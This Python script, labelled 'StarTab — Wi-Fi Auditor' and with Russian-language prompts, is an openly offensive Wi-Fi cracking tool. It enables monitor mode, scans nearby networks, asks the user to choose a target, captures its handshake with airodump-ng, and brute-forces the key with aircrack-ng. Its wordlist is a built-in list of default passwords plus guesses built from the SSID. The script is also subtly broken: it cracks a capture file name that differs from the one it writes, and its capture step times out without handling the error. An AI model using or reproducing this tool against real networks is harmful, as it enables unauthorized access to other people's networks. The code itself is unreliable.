import subprocess
import re
import os
import sys
import time
import signal

DEFAULT_PASSWORDS = [
    "12345678", "88888888", "888888eu", "11111111", "1234567890",
    "password", "admin", "1234", "00000000", "11223344",
    "87654321", "123456789", "qwertyui", "asdfghjk", "zxcvbnm",
    "1111", "2222", "3333", "4444", "5555", "6666", "7777", "8888", "9999", "0000",
    "1234", "4321", "abcd1234", "admin123", "root", "changeme",
    "default", "guest", "user", "pass", "pass1234", "P@ssw0rd",
    "wifi", "wlan", "network", "internet", "wireless",
    "0987654321", "0123456789", "98765432", "abcd", "dcba"
]

def get_interfaces():
    result = subprocess.run(["iwconfig"], capture_output=True, text=True, timeout=5)
    interfaces = []
    for line in result.stdout.split('\n'):
        m = re.match(r'^(\S+)\s+.*IEEE 802.11', line)
        if m:
            interfaces.append(m.group(1))
    return interfaces

def enable_monitor(iface):
    subprocess.run(["sudo", "airmon-ng", "start", iface], capture_output=True, timeout=10)
    mon_iface = iface + "mon"
    result = subprocess.run(["iwconfig"], capture_output=True, text=True, timeout=5)
    if mon_iface in result.stdout:
        return mon_iface
    for line in result.stdout.split('\n'):
        m = re.match(r'^(\S+mon)\s+', line)
        if m:
            return m.group(1)
    return None

def disable_monitor(mon_iface):
    subprocess.run(["sudo", "airmon-ng", "stop", mon_iface], capture_output=True, timeout=10)

def scan_networks(mon_iface, timeout=8):
    output_file = "/tmp/star_scan"
    proc = subprocess.Popen([
        "sudo", "airodump-ng", mon_iface,
        "-w", output_file,
        "--output-format", "csv",
        "--write-interval", "1"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    time.sleep(timeout)
    proc.terminate()
    proc.wait()
    
    networks = []
    csv_file = output_file + "-01.csv"
    
    if os.path.exists(csv_file):
        with open(csv_file, "r", errors="ignore") as f:
            lines = f.readlines()
        
        in_clients = False
        for line in lines:
            line = line.strip()
            if line.startswith("BSSID"):
                continue
            if line.startswith("Station MAC"):
                in_clients = True
                continue
            if not line or in_clients:
                continue
            
            parts = [p.strip() for p in line.split(",")]
            if len(parts) >= 14:
                bssid = parts[0]
                channel = parts[3]
                signal = parts[8]
                auth = parts[5]
                essid = parts[13]
                
                if bssid and bssid.count(":") == 5 and essid:
                    networks.append({
                        'bssid': bssid,
                        'channel': channel,
                        'signal': signal,
                        'auth': auth,
                        'essid': essid
                    })
        
        for f in [csv_file, output_file + "-01.kismet.csv", output_file + "-01.cap"]:
            if os.path.exists(f):
                os.remove(f)
    
    return networks

def try_passwords(ssid, bssid, channel, mon_iface, passwords):
    print(f"\n[*] Подбор для: {ssid} ({bssid})")
    print(f"[*] Всего попыток: {len(passwords)}")
    
    for i, pwd in enumerate(passwords, 1):
        wordlist_file = f"/tmp/star_word_{os.getpid()}.txt"
        with open(wordlist_file, "w") as f:
            f.write(pwd + "\n")
        
        result = subprocess.run([
            "sudo", "aircrack-ng", "-w", wordlist_file,
            "-b", bssid, "/tmp/star_capture.cap"
        ], capture_output=True, text=True, timeout=30)
        
        os.remove(wordlist_file)
        
        if "KEY FOUND" in result.stdout or "FOUND" in result.stdout:
            print(f"[+] ПАРОЛЬ НАЙДЕН: {pwd}")
            return pwd
        
        sys.stdout.write(f"\r[*] Попытка {i}/{len(passwords)}: {pwd}   ")
        sys.stdout.flush()
    
    print("\n[-] Пароль не найден")
    return None

def masks_for_ssid(ssid):
    masks = set()
    if len(ssid) >= 8 and ssid.isdigit():
        masks.add(ssid)
        masks.add(''.join(str((int(c) + 1) % 10) for c in ssid if c.isdigit()))
        masks.add(''.join(str((int(c) - 1) % 10) for c in ssid if c.isdigit()))
    if len(ssid) >= 8:
        for i in range(1, min(5, len(ssid))):
            if len(ssid) - i >= 8:
                masks.add(ssid[:-i])
    for i in range(4, min(8, len(ssid))):
        pattern = ssid[:i]
        if len(pattern * (8 // i) + pattern[:8 % i]) == 8:
            masks.add(pattern * (8 // i) + pattern[:8 % i])
    return [m for m in masks if len(m) == 8 and m]

def main():
    print(r"""
   _____ _         _____            _   
  / ____| |       |_   _|          | |  
 | (___ | |_ __ _   | |  __ _ _ __ | |_ 
  \___ \| __/ _` |  | | / _` | '_ \| __|
  ____) | || (_| | _| || (_| | |_) | |_ 
 |_____/ \__\__,_| \______\__,_| .__/ \__|
                                | |        
                                |_|        
    """)
    print("[*] StarTab — Wi-Fi Auditor")
    
    interfaces = get_interfaces()
    if not interfaces:
        print("[!] Нет Wi-Fi интерфейса!")
        print("[*] Проверь: sudo iwconfig")
        sys.exit(1)
    
    print(f"[*] Найден интерфейс: {interfaces[0]}")
    print("[*] Включение monitor mode...")
    
    mon_iface = enable_monitor(interfaces[0])
    if not mon_iface:
        print("[!] Не удалось включить monitor mode")
        print("[*] Попробуй: sudo airmon-ng start", interfaces[0])
        sys.exit(1)
    
    print(f"[*] Monitor mode: {mon_iface}")
    
    try:
        print("\n[*] Сканирование сетей (8 сек)...")
        networks = scan_networks(mon_iface)
        
        if not networks:
            print("[!] Сети не найдены")
            return
        
        print(f"\n[+] Найдено сетей: {len(networks)}")
        print("-" * 90)
        print(f"{'#':<4} {'SSID':<30} {'BSSID':<18} {'Канал':<6} {'Сигнал':<6} {'Тип':<12}")
        print("-" * 90)
        
        for i, net in enumerate(networks, 1):
            ssid = net['essid']
            marker = "*" if ssid.startswith(('W', 'w', 'CD', 'cd', 'WD', 'wd')) else ""
            print(f"{i:<4} {ssid[:30]:<30} {net['bssid']:<18} {net['channel']:<6} {net['signal']:<6} {net['auth']:<12}{marker}")
        
        print("\n[*] Выбери номер сети (0 — выход):")
        choice = int(input("> "))
        if choice == 0:
            return
        
        target = networks[choice - 1]
        ssid = target['essid']
        
        print(f"\n[*] Цель: {ssid}")
        print("[*] Методы:")
        print("1 — Дефолтные пароли")
        print("2 — Дефолтные + маски SSID")
        
        method = input("Выбери (1-2): ").strip()
        
        passwords = set()
        passwords.update(DEFAULT_PASSWORDS)
        
        if method == '2':
            passwords.update(masks_for_ssid(ssid))
        
        passwords = [p.strip() for p in passwords if len(p.strip()) >= 4]
        
        # Ловим handshake
        print("[*] Ловим handshake (30 сек)...")
        subprocess.run([
            "sudo", "airodump-ng", "-c", target['channel'],
            "-d", target['bssid'],
            "-w", "/tmp/star_capture", "--output-format", "cap",
            mon_iface
        ], timeout=30, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        if os.path.exists("/tmp/star_capture-01.cap"):
            try_passwords(ssid, target['bssid'], target['channel'], mon_iface, list(passwords))
        else:
            print("[!] Не удалось захватить handshake")
            
    finally:
        disable_monitor(mon_iface)
        for f in ["/tmp/star_capture-01.cap", "/tmp/star_capture-01.csv"]:
            if os.path.exists(f):
                os.remove(f)

if __name__ == "__main__":
    main()
